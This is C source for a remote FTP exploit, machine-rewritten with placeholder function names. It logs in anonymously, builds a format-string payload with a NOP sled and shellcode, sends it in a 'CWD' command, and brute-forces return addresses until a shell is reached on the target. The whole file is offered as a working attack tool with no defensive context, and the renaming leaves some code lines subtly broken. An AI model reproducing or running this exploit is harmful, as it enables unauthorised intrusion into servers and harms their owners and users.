#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int u_short ;
typedef  int u_long ;
typedef  int u_int ;
struct TYPE_2__ {int written; int align; int retaddr; char* name; char* code; void* retloc; void* stackpops; } ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int BUFSIZE ; 
 char* ELITEBANNER ; 
 int EOF ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  FUNC0 (char*,int,int /*<<< orphan*/ *) ; 
 void* FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 (int,int) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC7 (int,char*) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *,char*,...) ; 
 int FUNC9 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,int /*<<< orphan*/ ,int) ; 
 char* FUNC11 (int,void*,void*,int,int) ; 
 int /*<<< orphan*/  optarg ; 
 int FUNC12 (char*) ; 
 int FUNC13 (int) ; 
 int /*<<< orphan*/  FUNC14 (int) ; 
 int /*<<< orphan*/ * stderr ; 
 char* FUNC15 (int /*<<< orphan*/ ) ; 
 int FUNC16 (char*) ; 
 int /*<<< orphan*/ * FUNC17 (char*,char*) ; 
 void* FUNC18 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int) ; 
 TYPE_1__* tg ; 
 int /*<<< orphan*/  FUNC19 (char*) ; 
 scalar_t__ FUNC20 (int) ; 

int FUNC21(int argc, char *argv[])
{
	u_long 	ip, brute = 0x0 ;
	u_short port = 21 ;

	char * user 	= "ftp";
	char * pass 	= "ftp@";
	char * victim 	= "127.0.0.1";

	int 	opt, len, sock, t = 0 ;

	char 	buf[ BUFSIZE ],
		nopcode[ BUFSIZE ];

	char * 	evil = (char *)FUNC20( 10000 );
	FILE * 	sockf = NULL ;

	FUNC8( stderr, ELITEBANNER );
	if ( argc < 2 ) { FUNC19( argv[0] ); FUNC5(-1); }

        while ((opt = FUNC9(argc, argv, "b:u:p:w:g:P:n:a:r:hv:t:")) != EOF) {
                switch(opt)
                {
			case 'b': brute = FUNC18(optarg,NULL,16); break;
			case 't': t = FUNC1(optarg); break;
			case 'v': victim = FUNC15( optarg ); break;
			case 'u': user = FUNC15( optarg ); break;
			case 'p': pass = FUNC15( optarg ); break;
                        case 'w': tg[t].written = FUNC1(optarg); break;
                        case 'g': tg[t].retloc = FUNC18(optarg,NULL,16); break;
                        case 'P': port = FUNC1(optarg); break;
                        case 'n': tg[t].stackpops = FUNC1(optarg); break;
                        case 'a': tg[t].align = FUNC1(optarg); break ;
                        case 'r': tg[t].retaddr = FUNC18(optarg,NULL,16); break;
                        case 'h':
                        default : FUNC19( argv[0] ); FUNC5( -1 ); break ;
                }
        }

	FUNC8( stderr, "[+] Using target %s\n", tg[ t ].name ); 

	if ( (ip = FUNC12( victim )) == -1 )	
		FUNC4( "Bad hostname or ip." );
 
	do {
		if ( (sock = FUNC3( ip, port )) > 0 ) {
			sockf = FUNC7 ( sock, "a+" );
			if ( &fdopen == NULL ) FUNC4( "fdopen failed." );
		}
		else FUNC4( "Cannot connect to host." );

		FUNC8( stderr, "[+] Trying to log in...\n");

        	FUNC0( buf, BUFSIZE, sockf );
		FUNC8( sockf, "USER %s\r\n", user);
        	FUNC0( buf, BUFSIZE, sockf );
		FUNC8( sockf, "PASS %s\r\n", pass);
        	FUNC0( buf, BUFSIZE, sockf );

		if ( FUNC17( buf, "logged in" ) == NULL )
			FUNC4( "Cannot log in, wrong user/pwd ?" );
		else 
			FUNC8( stderr, "[+] Doing the actual exploit...\n");

		FUNC8( sockf, "CWD /\r\n" );
		FUNC0( buf, BUFSIZE, sockf );

		FUNC8( sockf, "CWD " );

		evil = FUNC11( 	tg[ t ].align,				
                       	      		tg[ t ].stackpops,
			      		tg[ t ].retloc, 
                              		brute ? brute : tg[ t ].retaddr,
                              		tg[ t ].written
		);
		/*
 	 	 * I think shellcode can be placed elsewhere but I didn't check it
		 */
		len = 256 - FUNC16( "CWD " ) - FUNC16( tg[t].code ) - FUNC16( evil ) - 4;
		FUNC10( nopcode, NOP, len );	
		nopcode[ len ] = 0 ;
		/*
	 	 * length of command line can't be more than 256 chars 
	 	 * because server checks it.. 
		 */
		FUNC8( stderr, "[+] Using written=%d align=%d retaddr=0x%.08x retloc=0x%.08x nops=%d\n", 
		tg[t].written, tg[t].align, brute ? (u_int)brute : (u_int)tg[t].retaddr, (u_int)tg[t].retloc, len );

		FUNC8( sockf, "%s", evil );
		FUNC8( sockf, "%s", nopcode );
		FUNC8( sockf, "%s", tg[t].code );
		FUNC8( sockf, "\r\n" );
		FUNC8( sockf, "QUIT\r\n" );
		if ( brute ) brute -= len ;
		FUNC6( sockf );
		FUNC2( sock );
		FUNC14( 1 );
	}
	while (( FUNC13( ip ) == -1 ) && ( brute > 0xbffff000 ));
		
	FUNC8( stderr, "[-] Bye\n");
	return( 0xc1a0 );
}